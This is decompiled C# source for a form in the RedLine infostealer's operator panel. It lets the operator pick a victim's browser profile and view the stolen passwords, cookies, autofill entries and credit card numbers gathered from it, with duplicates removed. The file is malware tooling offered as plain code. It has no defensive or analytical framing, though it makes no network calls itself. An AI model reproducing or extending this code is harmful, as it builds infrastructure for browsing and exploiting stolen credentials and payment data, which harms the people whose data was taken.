using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using MetroSet_UI.Controls;
using MetroSet_UI.Design;
using RedLine.MainPanel.Data.Extensions;
using RedLine.MainPanel.Models;
using RedLine.SharedModels;

namespace RedLine.MainPanel.Views;

public class ChooseBrowserFrm : Form
{
	[CompilerGenerated]
	private readonly ViewerType viewerType_0;

	[CompilerGenerated]
	private UserLog userLog_0;

	private object object_0;

	private object topHeader;

	private object mainTitle;

	private object closeBtn;

	private object browsersCb;

	private object goBtn;

	private ViewerType viewerType
	{
		[CompilerGenerated]
		get
		{
			return viewerType_0;
		}
	}

	private UserLog user
	{
		[CompilerGenerated]
		get
		{
			return userLog_0;
		}
		[CompilerGenerated]
		set
		{
			userLog_0 = value;
		}
	}

	public ChooseBrowserFrm(UserLog _user, ViewerType _viewerType)
	{
		c();
		this.AllowDraggBy((Control)topHeader);
		this.ApplyShadows();
		viewerType_0 = _viewerType;
		user = _user;
		Setup();
	}

	public void Setup()
	{
		IList<Browser> browsers = user.Credentials.Browsers;
		if (browsers == null)
		{
			MessageBox.Show(this, "All Browsers are empty");
			Close();
		}
		else
		{
			if (browsers.Count <= 0)
			{
				return;
			}
			IEnumerable<Browser> source = browsers.Where((Browser x) => !x.IsEmpty());
			if (!source.Any())
			{
				MessageBox.Show(this, "All Browsers are empty");
				Close();
			}
			else
			{
				List<string> list = source.Select((Browser x) => x.Name + "_" + x.Profile).ToList();
				list.Add("*ALL*");
				((ComboBox)browsersCb).DataSource = list.OrderByDescending((string x) => x).Reverse().ToArray();
				((ListControl)browsersCb).SelectedIndex = 0;
			}
			source = null;
		}
	}

	private void closeBtn_Click(object sender, object e)
	{
		Close();
	}

	private void goBtn_Click(object sender, object e)
	{
		ShowData();
	}

	public void ShowData()
	{
		string currentBrowser = ((ComboBox)browsersCb).SelectedText;
		IList<Browser> list = null;
		list = ((!(currentBrowser == "*ALL*")) ? user.Credentials.Browsers.Where((Browser x) => x.Name + "_" + x.Profile == currentBrowser).ToList() : user.Credentials.Browsers);
		if (list != null)
		{
			if (list.Count == 0 && currentBrowser == "*ALL*")
			{
				MessageBox.Show(this, "Browsers is empty");
			}
			else
			{
				DistinctAndShow(list);
			}
		}
		list = null;
	}

	public void DistinctAndShow(IList<Browser> browsers)
	{
		switch (viewerType)
		{
		case ViewerType.Passwords:
		{
			IEnumerable<LoginPair> enumerable3 = browsers.Where((Browser q) => q.Credentials != null).SelectMany((Browser x) => x.Credentials);
			if (enumerable3.Any())
			{
				List<LoginPair> list3 = new List<LoginPair>();
				foreach (LoginPair pair in enumerable3)
				{
					if (!list3.Any((LoginPair x) => x.Host == pair.Host && x.Login == pair.Login && x.Password == pair.Password))
					{
						list3.Add(pair);
					}
				}
				new PassViewer(new BindingList<LoginPair>(list3)).ShowDialog(this);
			}
			else
			{
				MessageBox.Show(this, "Password list is empty");
			}
			enumerable3 = null;
			break;
		}
		case ViewerType.Cookies:
		{
			IEnumerable<Cookie> enumerable4 = browsers.Where((Browser q) => q.Cookies != null).SelectMany((Browser x) => x.Cookies);
			if (enumerable4.Any())
			{
				List<Cookie> list4 = new List<Cookie>();
				foreach (Cookie pair in enumerable4)
				{
					if (!list4.Any((Cookie x) => x.Host == pair.Host && x.Name == pair.Name && x.Value == pair.Value && x.Path == pair.Path))
					{
						list4.Add(pair);
					}
				}
				new CookieViewer(new BindingList<Cookie>(list4)).ShowDialog(this);
			}
			else
			{
				MessageBox.Show(this, "Cookie list is empty");
			}
			enumerable4 = null;
			break;
		}
		case ViewerType.Autofills:
		{
			IEnumerable<Autofill> enumerable2 = browsers.Where((Browser q) => q.Autofills != null).SelectMany((Browser x) => x.Autofills);
			if (enumerable2.Any())
			{
				List<Autofill> list2 = new List<Autofill>();
				foreach (Autofill pair in enumerable2)
				{
					if (!list2.Any((Autofill x) => x.Name == pair.Name && x.Value == pair.Value))
					{
						list2.Add(pair);
					}
				}
				new AutofillesViewer(new BindingList<Autofill>(list2)).ShowDialog(this);
			}
			else
			{
				MessageBox.Show(this, "Cookie list is empty");
			}
			enumerable2 = null;
			break;
		}
		case ViewerType.CreditCards:
		{
			IEnumerable<CreditCard> enumerable = browsers.Where((Browser q) => q.CreditCards != null).SelectMany((Browser x) => x.CreditCards);
			if (enumerable.Any())
			{
				List<CreditCard> list = new List<CreditCard>();
				foreach (CreditCard pair in enumerable)
				{
					if (!list.Any((CreditCard x) => x.Holder == pair.Holder && x.CardNumber == pair.CardNumber && x.ExpirationMonth == pair.ExpirationMonth && x.ExpirationYear == pair.ExpirationYear))
					{
						list.Add(pair);
					}
				}
				new CreditCardViewer(new BindingList<CreditCard>(list)).ShowDialog(this);
			}
			else
			{
				MessageBox.Show(this, "Cookie list is empty");
			}
			enumerable = null;
			break;
		}
		}
	}

	private void topHeader_Paint(object sender, object e)
	{
		int num = ((Control)topHeader).Width - 1;
		int num2 = ((Control)topHeader).Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void a(object sender, object e)
	{
		int num = base.Width - 1;
		int num2 = base.Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && object_0 != null)
		{
			((IDisposable)object_0).Dispose();
		}
		base.Dispose(disposing);
	}

	private void c()
	{
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ChooseBrowserFrm));
		topHeader = new Panel();
		mainTitle = new Label();
		closeBtn = new Label();
		browsersCb = new ComboBox();
		goBtn = (object)new MetroSetButton();
		((Control)topHeader).SuspendLayout();
		SuspendLayout();
		((Control)topHeader).BackColor = Color.FromArgb(52, 56, 67);
		((Control)topHeader).Controls.Add((Control)mainTitle);
		((Control)topHeader).Controls.Add((Control)closeBtn);
		((Control)topHeader).Dock = DockStyle.Top;
		((Control)topHeader).ForeColor = Color.Silver;
		((Control)topHeader).Location = new Point(0, 0);
		((Control)topHeader).Name = "topHeader";
		((Control)topHeader).Size = new Size(372, 30);
		((Control)topHeader).TabIndex = 3;
		((Control)topHeader).Paint += topHeader_Paint;
		((Control)mainTitle).AutoSize = true;
		((Control)mainTitle).Font = new Font("Segoe UI", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
		((Control)mainTitle).ForeColor = Color.Red;
		((Control)mainTitle).Location = new Point(3, 4);
		((Control)mainTitle).Name = "mainTitle";
		((Control)mainTitle).Size = new Size(180, 20);
		((Control)mainTitle).TabIndex = 2;
		((Control)mainTitle).Text = "RedLine | Choose Browser";
		((Control)closeBtn).AutoSize = true;
		((Control)closeBtn).Font = new Font("Segoe UI Semibold", 12f, FontStyle.Bold, GraphicsUnit.Point, 204);
		((Control)closeBtn).ForeColor = Color.White;
		((Control)closeBtn).Location = new Point(349, 4);
		((Control)closeBtn).Name = "closeBtn";
		((Control)closeBtn).Size = new Size(20, 21);
		((Control)closeBtn).TabIndex = 1;
		((Control)closeBtn).Text = "X";
		((Control)closeBtn).Click += closeBtn_Click;
		((Control)browsersCb).BackColor = Color.FromArgb(52, 56, 67);
		((ComboBox)browsersCb).FlatStyle = FlatStyle.Flat;
		((Control)browsersCb).Font = new Font("Segoe UI", 9f);
		((Control)browsersCb).ForeColor = Color.FromArgb(200, 200, 200);
		((ListControl)browsersCb).FormattingEnabled = true;
		((Control)browsersCb).Location = new Point(12, 54);
		((Control)browsersCb).Name = "browsersCb";
		((Control)browsersCb).Size = new Size(264, 23);
		((Control)browsersCb).TabIndex = 19;
		((MetroSetButton)goBtn).DisabledBackColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)goBtn).DisabledBorderColor = Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)goBtn).DisabledForeColor = Color.Gray;
		((Control)goBtn).Font = new Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)goBtn).HoverBorderColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)goBtn).HoverColor = Color.FromArgb(95, 207, 255);
		((MetroSetButton)goBtn).HoverTextColor = Color.White;
		((Control)goBtn).Location = new Point(282, 54);
		((Control)goBtn).Name = "goBtn";
		((MetroSetButton)goBtn).NormalBorderColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)goBtn).NormalColor = Color.FromArgb(65, 177, 225);
		((MetroSetButton)goBtn).NormalTextColor = Color.White;
		((MetroSetButton)goBtn).PressBorderColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)goBtn).PressColor = Color.FromArgb(35, 147, 195);
		((MetroSetButton)goBtn).PressTextColor = Color.White;
		((Control)goBtn).Size = new Size(75, 23);
		((MetroSetButton)goBtn).Style = (Style)0;
		((MetroSetButton)goBtn).StyleManager = null;
		((Control)goBtn).TabIndex = 20;
		((Control)goBtn).Text = "Go";
		((MetroSetButton)goBtn).ThemeAuthor = "Narwin";
		((MetroSetButton)goBtn).ThemeName = "MetroLite";
		((Control)goBtn).Click += goBtn_Click;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(52, 56, 67);
		base.ClientSize = new Size(372, 102);
		base.Controls.Add((Control)goBtn);
		base.Controls.Add((Control)browsersCb);
		base.Controls.Add((Control)topHeader);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		base.Name = "ChooseBrowserFrm";
		base.StartPosition = FormStartPosition.CenterScreen;
		Text = "RedLine | Choose browser";
		base.Paint += a;
		((Control)topHeader).ResumeLayout(performLayout: false);
		((Control)topHeader).PerformLayout();
		ResumeLayout(performLayout: false);
	}
}
